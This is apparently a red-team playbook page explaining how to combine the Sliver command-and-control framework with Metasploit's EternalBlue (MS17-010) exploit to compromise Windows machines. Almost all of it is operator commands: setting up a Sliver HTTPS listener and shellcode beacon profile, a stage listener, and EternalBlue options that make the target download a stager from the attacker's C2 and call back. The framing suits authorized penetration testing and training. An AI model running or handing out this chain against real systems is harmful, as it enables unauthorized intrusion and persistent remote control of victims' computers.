---
author(s):
  - Userware
tags:
  - initial-access
  - exploitation
  - sliver
  - windows
---
# Sliver

> [!NOTE]
> This section is subjected to change with different exploits as they get patched as time passes.

This is similar to [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xF - Remote Services Exploitation/Exploit Vulnerable Service/Cobalt Strike|cobalt strike]] exploitation setup. However, it requires less effort to exploit the vulnerable services.

```
sliver > https -l 443

sliver > profiles new beacon -b https://<IP> -S 5 -J 10 -l -a x64 -o windows -f shellcode stager-shellcode
```

Depending on the listener (or shell handler) type. If the schema is set to HTTPS (`https://<attacker_IP>`) then use `windows/x64/custom/reverse_winhttps` as a payload in #metasploit-framework for an HTTPS stager. If the schema doesn't have TLS encryption (`http://<attacker_IP>`) then use `windows/x64/custom/reverse_winhttp` for an HTTP stager.

```
sliver > stage-listener -u http://<IP>:8080 -P -p stager-shellcode
```

We'll be using eternablue as an example.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Depending on the listener (or shell handler) type. Set the payload to `windows/x64/custom/reverse_winhttps` for an HTTPS beacon network traffic. If you're using HTTP beacon network traffic without TLS (encrypted packets) then set the payload to `windows/x64/custom/reverse_winhttp`. You're not really delivering `meterpreter` session.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/custom/reverse_winhttps

msf6 exploit(windows/smb/ms17_010_eternalblue) > options
```

Set the target's IP address.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts <target_IP>
```

Specify the C2's IP address and port. This will receive from a sliver's payload staging. Youâ€™re telling #metasploit-framework in this case to download an HTTPS stager from sliver.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost <sliver_C2_IP>

msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport 8080

msf6 exploit(windows/smb/ms17_010_eternalblue) > set luri /beacon.woff
```

Exploit the target and you should receive an agent callback on your C2.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```